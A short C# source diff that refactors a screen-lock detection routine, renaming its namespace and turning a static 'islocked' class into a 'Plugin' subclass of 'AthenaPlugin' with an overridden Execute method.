@@ -4,7 +4,7 @@ using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using System.Text;
 
-namespace Plugin
+namespace Plugins
 {
     public static class NativeMethods
     {//https://stackoverflow.com/questions/3953297/detecting-if-the-screensaver-is-active-and-or-the-user-has-locked-the-screen-in/9858981#9858981 
@@ -90,14 +90,9 @@ namespace Plugin
             return ScrOff;
         }
     }
-
-
-    public static class islocked
+    public class Plugin : AthenaPlugin
     {
-        //TODO:
-        //Linux Support
-        //Test OSX
-        public static void Execute(Dictionary<string, object> args)
+        public override void Execute(Dictionary<string, object> args)
         {
             try
             {
